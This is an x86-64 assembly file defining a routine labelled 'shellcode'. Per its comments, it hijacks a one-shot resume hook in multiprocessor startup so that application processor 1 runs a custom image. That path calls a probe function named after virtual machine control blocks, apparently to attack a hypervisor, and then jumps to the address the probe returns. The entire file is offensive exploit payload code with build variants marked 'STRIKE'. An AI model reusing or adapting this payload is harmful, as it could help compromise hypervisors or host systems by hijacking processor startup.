.intel_syntax noprefix
.text
.global shellcode
.type shellcode, @function

// startup_mp passes the AP index in rdi. The one-shot resume hook launches
// our custom image on AP 1; only that AP uses the carrier-page stack.
shellcode:
    lea     rsp, [rip + 0xef9]          // page + 0xf00: parameter block
#ifdef STRIKE_COMPACT_ENTRY
    cmp     edi, 1
#else
    cmp     rdi, 1
#endif
    jne     stock
    push    rbx
    push    rsi
    push    rdi
#ifdef STRIKE_COMPACT_ENTRY
    push    0
    lea     rdi, [rsp + 0x20]
#else
    sub     rsp, 8
    lea     rbx, [rsp + 0x20]
    mov     rdi, rbx
#endif
    call    vmcb_probe_1270
#ifdef STRIKE_COMPACT_ENTRY
    mov     rcx, qword ptr [rsp + 0x20]
    pop     rdx
#else
    mov     rcx, qword ptr [rbx]
    add     rsp, 8
#endif
    pop     rdi
    pop     rsi
    pop     rbx
    jmp     rcx
stock:
    mov     rcx, qword ptr [rsp]
    jmp     rcx
.size shellcode, .-shellcode
